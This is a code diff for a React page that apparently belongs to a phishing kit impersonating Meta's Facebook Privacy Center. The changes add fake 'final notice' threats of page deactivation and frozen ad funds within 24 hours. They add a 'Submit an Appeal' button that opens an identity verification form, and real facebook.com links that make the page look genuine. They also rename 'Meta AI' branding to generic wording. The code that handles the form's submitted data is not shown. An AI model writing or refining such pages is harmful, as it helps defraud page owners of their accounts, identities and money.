@@ -28,13 +28,6 @@ interface MenuItem {
     isActive?: boolean;
 }
 
-interface InfoCardItem {
-    id: string;
-    title: string;
-    subtitle: string;
-    image?: StaticImageData;
-}
-
 const menuItems: MenuItem[] = [
     {
         id: 'home',
@@ -64,6 +57,13 @@ const menuItems: MenuItem[] = [
     }
 ];
 
+interface InfoCardItem {
+    id: string;
+    title: string;
+    subtitle: string;
+    image?: StaticImageData;
+}
+
 const privacyCenterItems: InfoCardItem[] = [
     {
         id: 'policy',
@@ -82,7 +82,7 @@ const privacyCenterItems: InfoCardItem[] = [
 const agreementItems: InfoCardItem[] = [
     {
         id: 'meta-ai',
-        title: 'Meta AI',
+        title: 'AI Product',
         subtitle: 'User Agreement',
         image: MetaAI
     }
@@ -97,7 +97,7 @@ const resourceItems: InfoCardItem[] = [
     {
         id: 'ai-systems',
         title: 'Cards with information about the operation of AI systems',
-        subtitle: 'Meta AI website'
+        subtitle: 'Product AI website'
     },
     {
         id: 'intro-ai',
@@ -149,7 +149,7 @@ const Page: FC = () => {
 
         isTranslatingRef.current = true;
 
-        const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'Policy Violation', 'We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.', 'Ad account disabled', 'You can’t use this account to run ads. This ad account has been disabled, and some of its advertising assets may also be disabled.', 'Appeal', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Meta AI', 'User Agreement', 'For more details, see the User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Meta AI website', 'Introduction to Generative AI', 'For teenagers', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy'];
+        const textsToTranslate = ['Fanpage Violation - Appeal Request', "We have detected that your page has violated Meta's Community Standards and Advertising Policies. As a result, your page has been flagged as non-compliant. This may lead to restrictions or, in more serious cases, permanent deactivation of your page and associated ad accounts.", 'This is your final notice. If no action is taken within 24 hours, your page will be permanently disabled, and any remaining ad credit balance will be frozen. These funds will not be recoverable after the deadline.', 'To appeal this decision and keep your page active, please complete the verification form below. Our system requires accurate information to process your appeal. Missing or incorrect details may delay the review process, and your request may be automatically rejected.', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy.', 'Appeal Request', 'Confirming your page ownership and identity to appeal this decision', 'Please make sure to provide the required information below. Missing details may delay the processing of your request.', 'Submit an Appeal', 'Privacy Center', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Privacy Policy', 'For more details, see the User Agreement', 'AI Product', 'User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Product AI website', 'Introduction to Generative AI', 'For teenagers'];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -166,102 +166,131 @@ const Page: FC = () => {
 
     return (
         <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
-            <title>Policy Violation - Page Appeal</title>
+            <title>{t('Fanpage Violation - Appeal Request')}</title>
             <div className='flex w-full max-w-[1100px]'>
                 <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                     <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
                     <p className='my-4 text-2xl font-bold'>{t('Privacy Center')}</p>
-                    {menuItems.map((item) => (
-                        <div key={item.id} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
-                            <FontAwesomeIcon icon={item.icon} />
-                            <p>{t(item.label)}</p>
-                        </div>
-                    ))}
+                    {menuItems.map((item) => {
+                        const links: Record<string, string> = {
+                            home: '',
+                            search: '',
+                            privacy: 'https://www.facebook.com/privacy/policy/',
+                            rules: 'https://www.facebook.com/help/1857475815828426',
+                            settings: 'https://www.facebook.com/settings'
+                        };
+                        const link = links[item.id];
+
+                        return (
+                            <a key={item.id} href={link || '#'} target={link ? '_blank' : ''} rel={link ? 'noopener noreferrer' : ''} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium no-underline ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
+                                <FontAwesomeIcon icon={item.icon} />
+                                <p>{t(item.label)}</p>
+                            </a>
+                        );
+                    })}
                 </div>
                 <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                     <div className='flex items-center gap-2'>
                         <Image src={WarningImage} alt='' className='h-[50px] w-[50px]' />
-                        <p className='text-2xl font-bold'>{t('Policy Violation')}</p>
+                        <p className='text-2xl font-bold'>{t('Fanpage Violation - Appeal Request')}</p>
                     </div>
-                    <p>{t('We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.')}</p>
-                    <div className='rounded-b-[20px] bg-white'>
-                        <Image src={BackgroundImage} alt='' className='rounded-t-[20px]' />
-                        <div className='flex flex-col gap-5 p-5'>
-                            <div className='flex items-center gap-3'>
-                                <FontAwesomeIcon icon={faLock} className='text-xl text-[#e41e12]' />
-                                <p className='text-2xl font-bold'>{t('Ad account disabled')}</p>
+                    <p>{t("We have detected that your page has violated Meta's Community Standards and Advertising Policies. As a result, your page has been flagged as non-compliant. This may lead to restrictions or, in more serious cases, permanent deactivation of your page and associated ad accounts.")}</p>
+                    <p>{t('This is your final notice. If no action is taken within 24 hours, your page will be permanently disabled, and any remaining ad credit balance will be frozen. These funds will not be recoverable after the deadline.')}</p>
+                    <p>{t('To appeal this decision and keep your page active, please complete the verification form below. Our system requires accurate information to process your appeal. Missing or incorrect details may delay the review process, and your request may be automatically rejected.')}</p>
+
+                    <div className='overflow-hidden rounded-[12px] bg-[#e1eef7] p-[14px]'>
+                        <Image src={BackgroundImage} alt='' className='h-auto w-full rounded-[8px]' />
+
+                        <div className='mt-[10px] rounded-[12px] bg-white px-[14px] py-[13px]'>
+                            <p className='mb-[6px] text-[14px] font-medium text-[#050505]'>{t('Appeal Request')}</p>
+                            <p className='text-[14px] leading-[1.3] font-bold text-[#050505]'>{t('Confirming your page ownership and identity to appeal this decision')}</p>
+                            <p className='mt-[6px] text-[13.5px] leading-[1.35] text-[#050505]'>{t('Please make sure to provide the required information below. Missing details may delay the processing of your request.')}</p>
+                        </div>
+
+                        <button
+                            onClick={() => {
+                                setModalKey((prev) => prev + 1);
+                                setModalOpen(true);
+                            }}
+                            className='mt-[14px] flex h-[38px] w-full items-center justify-center rounded-full bg-[#0866ff] text-[13px] font-bold text-white'
+                        >
+                            {t('Submit an Appeal')}
+                        </button>
+                    </div>
+
+                    <div className='flex flex-col gap-4'>
+                        <div>
+                            <p className='mb-2 text-[16px] font-semibold'>{t('Privacy Center')}</p>
+                            <div className='overflow-hidden rounded-[15px] bg-white'>
+                                {privacyCenterItems.map((item, index) => {
+                                    const isFirst = index === 0;
+                                    const isLast = index === privacyCenterItems.length - 1;
+                                    const roundedClass = privacyCenterItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px]' : isLast ? 'rounded-b-[15px]' : '';
+
+                                    return (
+                                        <a key={item.id} href='https://www.facebook.com/privacy/policy/' target='_blank' rel='noopener noreferrer' className={`flex cursor-pointer items-center gap-3 border-b border-[#e4e6eb] px-4 py-3 no-underline transition hover:bg-[#f5f6f7] ${roundedClass}`}>
+                                            {item.image && <Image src={item.image} alt='' className='h-10 w-10' />}
+                                            <div className='flex flex-1 flex-col'>
+                                                <p className='text-[16px] leading-[1.25]'>{t(item.title)}</p>
+                                                <p className='text-[14px] text-[#344854]'>{t(item.subtitle)}</p>
+                                            </div>
+                                            <FontAwesomeIcon icon={faChevronRight} className='h-4 w-4 text-[#8a8d91]' />
+                                        </a>
+                                    );
+                                })}
                             </div>
-                            <p className='text-[15px] text-[#465a69]'>{t('You can’t use this account to run ads. This ad account has been disabled, and some of its advertising assets may also be disabled.')}</p>
-                            <button
-                                onClick={() => {
-                                    setModalKey((prev) => prev + 1);
-                                    setModalOpen(true);
-                                }}
-                                className='flex h-[50px] w-full items-center justify-center rounded-xl bg-blue-600 px-8 font-semibold text-white sm:w-fit sm:self-end'
-                            >
-                                {t('Appeal')}
-                            </button>
                         </div>
-                    </div>
-                    <div className='flex flex-col gap-3'>
-                        <div>
-                            <p className='font-sans font-medium text-[#212529]'>{t('Privacy Center')}</p>
-                            {privacyCenterItems.map((item, index) => {
-                                const isFirst = index === 0;
-                                const isLast = index === privacyCenterItems.length - 1;
-                                const roundedClass = privacyCenterItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';
 
-                                return (
-                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
-                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
-                                        <div className='flex flex-1 flex-col'>
-                                            <p className='font-medium'>{t(item.title)}</p>
-                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
-                                        </div>
-                                        <FontAwesomeIcon icon={faChevronRight} />
-                                    </div>
-                                );
-                            })}
-                        </div>
                         <div>
-                            <p className='font-sans font-medium text-[#212529]'>{t('For more details, see the User Agreement')}</p>
-                            {agreementItems.map((item, index) => {
-                                const isFirst = index === 0;
-                                const isLast = index === agreementItems.length - 1;
-                                const roundedClass = agreementItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';
+                            <p className='mb-2 text-[16px] font-semibold'>{t('For more details, see the User Agreement')}</p>
+                            <div className='overflow-hidden rounded-[15px] bg-white'>
+                                {agreementItems.map((item, index) => {
+                                    const isFirst = index === 0;
+                                    const isLast = index === agreementItems.length - 1;
+                                    const roundedClass = agreementItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px]' : isLast ? 'rounded-b-[15px]' : '';
 
-                                return (
-                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
-                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
-                                        <div className='flex flex-1 flex-col'>
-                                            <p className='font-medium'>{t(item.title)}</p>
-                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
-                                        </div>
-                                        <FontAwesomeIcon icon={faChevronRight} />
-                                    </div>
-                                );
-                            })}
+                                    return (
+                                        <a key={item.id} href='https://www.facebook.com/terms/' target='_blank' rel='noopener noreferrer' className={`flex cursor-pointer items-center gap-3 border-b border-[#e4e6eb] px-4 py-3 no-underline transition hover:bg-[#f5f6f7] ${roundedClass}`}>
+                                            {item.image && <Image src={item.image} alt='' className='h-10 w-10' />}
+                                            <div className='flex flex-1 flex-col'>
+                                                <p className='text-[16px] leading-[1.25]'>{t(item.title)}</p>
+                                                <p className='text-[14px] text-[#344854]'>{t(item.subtitle)}</p>
+                                            </div>
+                                            <FontAwesomeIcon icon={faChevronRight} className='h-4 w-4 text-[#8a8d91]' />
+                                        </a>
+                                    );
+                                })}
+                            </div>
                         </div>
+
                         <div>
-                            <p className='font-sans font-medium text-[#212529]'>{t('Additional resources')}</p>
-                            {resourceItems.map((item, index) => {
-                                const isFirst = index === 0;
-                                const isLast = index === resourceItems.length - 1;
-                                const roundedClass = resourceItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';
+                            <p className='mb-2 text-[16px] font-semibold'>{t('Additional resources')}</p>
+                            <div className='overflow-hidden rounded-[15px] bg-white'>
+                                {resourceItems.map((item, index) => {
+                                    const isFirst = index === 0;
+                                    const isLast = index === resourceItems.length - 1;
+                                    const roundedClass = resourceItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px]' : isLast ? 'rounded-b-[15px]' : '';
 
-                                return (
-                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
-                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
-                                        <div className='flex flex-1 flex-col'>
-                                            <p className='font-medium'>{t(item.title)}</p>
-                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
-                                        </div>
-                                        <FontAwesomeIcon icon={faChevronRight} />
-                                    </div>
-                                );
-                            })}
+                                    return (
+                                        <a key={item.id} href='https://www.facebook.com/privacy/center' target='_blank' rel='noopener noreferrer' className={`flex cursor-pointer items-center gap-3 border-b border-[#e4e6eb] px-4 py-3 no-underline transition hover:bg-[#f5f6f7] ${roundedClass}`}>
+                                            {item.image && <Image src={item.image} alt='' className='h-10 w-10' />}
+                                            <div className='flex flex-1 flex-col'>
+                                                <p className='text-[16px] leading-[1.25]'>{t(item.title)}</p>
+                                                <p className='text-[14px] text-[#344854]'>{t(item.subtitle)}</p>
+                                            </div>
+                                            <FontAwesomeIcon icon={faChevronRight} className='h-4 w-4 text-[#8a8d91]' />
+                                        </a>
+                                    );
+                                })}
+                            </div>
                         </div>
-                        <p className='text-[15px] text-[#465a69]'>{t('We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy')}</p>
+
+                        <p className='text-[15px] leading-[1.45] text-[#344854]'>
+                            {t('We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks.')}{' '}
+                            <a href='https://www.facebook.com/privacy/policy/' target='_blank' rel='noopener noreferrer' className='text-[#0866ff] hover:underline'>
+                                {t('Read more about Privacy Policy.')}
+                            </a>
+                        </p>
                     </div>
                 </div>
             </div>
